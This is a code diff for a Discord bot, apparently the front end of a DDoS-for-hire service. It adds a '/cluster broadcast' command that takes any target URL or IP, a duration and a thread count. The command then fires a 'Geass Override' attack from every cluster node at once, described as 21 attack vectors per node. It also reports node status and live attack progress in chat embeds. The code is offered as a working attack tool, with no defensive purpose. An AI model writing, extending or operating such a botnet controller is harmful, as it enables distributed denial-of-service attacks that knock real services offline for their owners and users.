@@ -30,6 +30,7 @@ import {
   buildErrorEmbed,
   buildGeassFiles,
   buildAttackFiles,
+  buildClusterEmbed,
   type ProbeResult,
 } from "./embeds.js";
 
@@ -145,6 +146,27 @@ const COMMANDS = [
   new SlashCommandBuilder()
     .setName("help")
     .setDescription("❓ Show Lelouch Britannia command guide"),
+
+  new SlashCommandBuilder()
+    .setName("cluster")
+    .setDescription("🌐 Cluster node management — check health and broadcast Geass to all nodes")
+    .addSubcommand(sub =>
+      sub.setName("status")
+        .setDescription("🔍 Check health and latency of all configured cluster nodes")
+    )
+    .addSubcommand(sub =>
+      sub.setName("broadcast")
+        .setDescription("👁️ Fire Geass Override ∞ to ALL cluster nodes simultaneously (10× power)")
+        .addStringOption(opt =>
+          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
+        )
+        .addIntegerOption(opt =>
+          opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
+        )
+        .addIntegerOption(opt =>
+          opt.setName("threads").setDescription("Base thread count per node (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
+        )
+    ),
 
   new SlashCommandBuilder()
     .setName("geass")
@@ -531,6 +553,95 @@ async function handleHelp(interaction: ChatInputCommandInteraction): Promise<voi
   await interaction.reply({ embeds: [buildHelpEmbed()], files: buildGeassFiles() });
 }
 
+async function handleCluster(interaction: ChatInputCommandInteraction): Promise<void> {
+  const sub = interaction.options.getSubcommand();
+
+  if (sub === "status") {
+    await interaction.deferReply();
+    try {
+      const status = await api.getClusterStatus();
+      await interaction.editReply({ embeds: [buildClusterEmbed(status)], files: buildGeassFiles() });
+    } catch (err: unknown) {
+      const message = err instanceof Error ? err.message : String(err);
+      await interaction.editReply({ embeds: [buildErrorEmbed("CLUSTER STATUS FAILED", message)] });
+    }
+    return;
+  }
+
+  if (sub === "broadcast") {
+    const target   = interaction.options.getString("target", true);
+    const duration = interaction.options.getInteger("duration") ?? 60;
+    const threads  = interaction.options.getInteger("threads")  ?? 200;
+    const isHttps  = /^https:/i.test(target);
+    const port     = isHttps ? 443 : 80;
+
+    await interaction.deferReply();
+
+    // Show loading state
+    await interaction.editReply({
+      embeds: [
+        new EmbedBuilder()
+          .setColor(COLORS.CRIMSON)
+          .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
+          .setDescription(
+            `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
+            `🌐 Broadcasting **ARES OMNIVECT** to **all cluster nodes** — 21 vectors × 10 machines`
+          )
+          .addFields(
+            { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
+            { name: "⏱ Duration", value: `**${duration}s**`,     inline: true },
+            { name: "🧵 Threads", value: `**${threads}** / node`, inline: true },
+          )
+          .setFooter({ text: AUTHOR })
+          .setTimestamp(),
+      ],
+    });
+
+    try {
+      // Fire the primary node — fan-out to all peers happens automatically server-side
+      const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
+      const clusterStatus = await api.getClusterStatus().catch(() => null);
+      const nodesOnline   = clusterStatus?.totalOnline ?? 1;
+      const row           = buildAttackButtons(attack.id, true);
+
+      console.log(`[CLUSTER BROADCAST] ${interaction.user.tag} → ${target} | ${nodesOnline} nodes | ${threads}t | ${duration}s`);
+
+      const msg = await interaction.editReply({
+        embeds: [
+          new EmbedBuilder()
+            .setColor(COLORS.CRIMSON)
+            .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
+            .setDescription(
+              `👁️ **ARES OMNIVECT × ${nodesOnline}** — All cluster nodes running 21 simultaneous attack vectors\n\n` +
+              `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
+            )
+            .setImage("attachment://lelouch.gif")
+            .setThumbnail("attachment://geass-symbol.png")
+            .addFields(
+              { name: "🎯 Target",         value: `\`${target}\``,           inline: true },
+              { name: "⏱ Duration",        value: `**${duration}s**`,        inline: true },
+              { name: "🧵 Threads/Node",   value: `**${threads}**`,          inline: true },
+              { name: "🌐 Nodes Online",   value: `**${nodesOnline}**`,      inline: true },
+              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 21}** simultaneous`, inline: true },
+              { name: "📊 Status",         value: "🔴 **ALL NODES INITIALIZING...**", inline: true },
+            )
+            .setFooter({ text: AUTHOR })
+            .setTimestamp(),
+        ],
+        components: [row],
+        files: buildAttackFiles(),
+      });
+
+      const userId = interaction.user.id;
+      startMonitor(attack.id, msg as Message, target, userId);
+    } catch (err: unknown) {
+      const message = err instanceof Error ? err.message : String(err);
+      await interaction.editReply({ embeds: [buildErrorEmbed("BROADCAST FAILED", message)] });
+    }
+    return;
+  }
+}
+
 async function handleGeass(interaction: ChatInputCommandInteraction): Promise<void> {
   await interaction.deferReply();
   const target   = interaction.options.getString("target", true);
@@ -770,6 +881,8 @@ async function main(): Promise<void> {
         await handleMethods(interaction);
       } else if (commandName === "help") {
         await handleHelp(interaction);
+      } else if (commandName === "cluster") {
+        await handleCluster(interaction);
       } else if (commandName === "geass") {
         await handleGeass(interaction);
       }
